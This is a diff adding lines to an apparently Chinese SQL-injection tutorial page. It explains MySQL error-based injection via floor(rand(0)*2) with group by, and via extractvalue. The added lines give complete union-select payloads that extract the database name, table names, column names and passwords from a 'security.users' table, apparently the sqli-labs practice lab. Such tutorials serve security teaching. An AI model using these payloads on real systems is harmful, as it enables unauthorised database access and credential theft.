@@ -463,6 +463,14 @@
 <p>需要count()计数，concat()将所有行放在同一列上，0x3a表示’:’为了报错好看而已，floor()向下取整，rand()0-1随机数函数，group by 分组。</p>
 <p>rand(0) 指定一个固定参数可以制造一个伪随机序列。即可以预测下次出啥数字。</p>
 <p>这个报错是利用排序时插入的key值不能相同而报错。利用报错回显出key值。</p>
+<p>查库：</p>
+<pre><code>id=-1&#39; union select count(*),concat(0x3a,(select database()),floor(rand(0)*2))a,3 from information_schema.columns group by a--+</code></pre>
+<p>查表：</p>
+<pre><code>id=-1&#39; union select count(*),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand(0)*2))a,3 from information_schema.tables group by a--+</code></pre>
+<p>查字段名：</p>
+<pre><code>id=-1&#39; union select count(*),concat(0x3a,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),floor(rand(0)*2))a,3 from information_schema.columns group by a--+</code></pre>
+<p>爆数据：</p>
+<pre><code>id=-1&#39; union select count(*),concat(0x3a,(select password from security.users limit 5,1),floor(rand(0)*2))a,3 from information_schema.columns group by a--+</code></pre>
 <h3 id="2-extactvalue-null-concat-2个参数"><a href="#2-extactvalue-null-concat-2个参数" class="headerlink" title="2.extactvalue(null,concat());2个参数"></a><strong>2.extactvalue(null,concat());2个参数</strong></h3><p>extractvalue注入的原理：extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p>
 <p>传入错误路径参数concat()，比如开头不能是~，：等  即0x7e，0x3a等来报错回显。</p>
 <p>id=’ or extractvalue(null,concat(0x3a,(select id from users limit 0,1),0x3a))</p>
